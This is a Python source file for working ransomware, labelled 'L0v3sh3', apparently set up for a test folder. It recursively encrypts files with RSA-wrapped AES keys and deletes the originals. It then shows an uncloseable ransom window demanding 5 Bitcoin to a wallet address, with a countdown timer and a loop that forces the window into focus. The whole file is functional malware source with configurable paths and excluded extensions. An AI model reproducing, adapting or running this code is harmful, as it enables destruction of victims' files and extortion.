###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

import base64
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import tkinter as tk
from functools import partial
from threading import Thread
from ewmh import EWMH

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

ENCRYPT_FOLDER_PATH = '/home/aleix/Desktop/TestFolder/'  # CHANGE THIS
EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe']  # CHANGE THIS
RANWOMWARE_WINDOW_NAME = 'L0v3sh3 Ransomware'  # CHANGE THIS

###########################################################################################################################

with open('./media/public.pem', 'rb') as f:
    public = f.read()
# print(base64.b64encode(public))

# public key with base64 encoding
pubKey = base64.b64encode(public)
pubKey = base64.b64decode(pubKey)

###########################################################################################################################

class GUI(Thread):
    def __init__(self):
        # Initialize the Thread part of the GUI object, so we can use its functions and attributes
        Thread.__init__(self)
        # Kill the thread when the main thread finishes
        self.daemon = True

    # Overwrite the run() method from thread. This code will be executed when using GUI.start()
    def run(self):
        self.root = tk.Tk()
        def disable_event(): pass
        self.root.protocol("WM_DELETE_WINDOW", disable_event)
        self.root.title(RANWOMWARE_WINDOW_NAME)
        self.root.geometry('500x300')
        self.root.resizable(False, False)
        label1 = tk.Label(self.root, text='All your files have been encrypted! \n\n Please send us 5 Bitcoin to this address:\n\nmkHS9ne12qx9pS9VojpwU5xtRd4T7X7ZUt\n\n', font=('calibri', 12,'bold'))
        label1.pack()
        self.label = tk.Label(self.root,font=('calibri', 50,'bold'), fg='white', bg='blue')
        self.label.pack()
        decrypt_button = tk.Button(self.root, text='Decrypt', command=decryption_traversal)
        decrypt_button.pack()

        # call countdown first time
        self.countdown('23:59:59')

        Thread(target=keep_active_window, daemon=True).start()

        self.root.mainloop()

    def countdown(self, count):
        # change text in label
        # count = '01:30:00'
        hour, minute, second = count.split(':')
        hour = int(hour)
        minute = int(minute)
        second = int(second)

        self.label['text'] = '{}:{}:{}'.format(hour, minute, second)

        if second > 0 or minute > 0 or hour > 0:
            # call countdown again after 1000ms (1s)
            if second > 0:
                second -= 1
            elif minute > 0:
                minute -= 1
                second = 59
            elif hour > 0:
                hour -= 1
                minute = 59
                second = 59
            self.root.after(1000, self.countdown, '{}:{}:{}'.format(hour, minute, second))

###########################################################################################################################

def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)

def decrypt(dataFile, privateKeyFile):

    # read private key from file
    with open(privateKeyFile, 'rb') as f:
        privateKey = f.read()
        # create private key object
        key = RSA.import_key(privateKey)

    # read data from file
    with open(dataFile, 'rb') as f:
        # read the session key
        encryptedSessionKey, nonce, tag, ciphertext = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]

    # decrypt the session key
    cipher = PKCS1_OAEP.new(key)
    sessionKey = cipher.decrypt(encryptedSessionKey)

    # decrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    # save the decrypted data to file
    [ fileName, fileExtension ] = dataFile.split('.')
    decryptedFile = fileName + '_decrypted.' + fileExtension
    with open(decryptedFile, 'wb') as f:
        f.write(data)

    print('Decrypted file saved to ' + decryptedFile) 
    
def encrypt(dataFile, publicKey):
    '''
    Input: path to file to encrypt, public key
    Output: encrypted file with extension .L0v3sh3 and remove original file
    use EAX mode to allow detection of unauthorized modifications
    '''
    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()

    # convert data to bytes
    data = bytes(data)

    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    fileName = dataFile.split(extension)[0]
    fileExtension = '.L0v3sh3'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
        [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
    os.remove(dataFile)

def encryption_traversal():
    for item in scanRecurse(ENCRYPT_FOLDER_PATH):
        filePath = Path(item)
        fileType = filePath.suffix.lower()

        if fileType in EXCLUDED_EXTENSIONS: continue
        encrypt(filePath, pubKey)

def decryption_traversal():
    for item in scanRecurse(ENCRYPT_FOLDER_PATH):
        filePath = Path(item)
        fileType = filePath.suffix.lower()

        if fileType in EXCLUDED_EXTENSIONS: continue
        decrypt(str(filePath), './media/private.pem')

###########################################################################################################################

def keep_active_window():
    while True:
        ewmh = EWMH()

        # Get the window that you want to focus on (replace 'Window Title' with the actual title)
        target_window = None
        for window in ewmh.getClientList():
            if window.get_wm_name() == RANWOMWARE_WINDOW_NAME:
                target_window = window
                break

        # Check if the target window was found
        if target_window:
            # Set the target window as the active window
            ewmh.setActiveWindow(target_window)
            ewmh.display.flush()

        ewmh.display.close()

###########################################################################################################################

# Deploys the ransomware
def encrypt_ransomware():
    encryption_traversal()

    my_GUI = GUI()
    my_GUI.start()

    return

# Deploys the ransomware
def decrypt_ransomware(key = None):
    decryption_traversal()

    return

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

def run():
    success = False
    print("[+] Ransomware module activated!")
    # code ...
    success = True
    return success

if __name__ == "__main__":
    from time import sleep
    encrypt_ransomware()

    # Uncomment to check if Tkinter can run on a different thread without freezing
    # for i in range(1000000): print(i)
    sleep(10)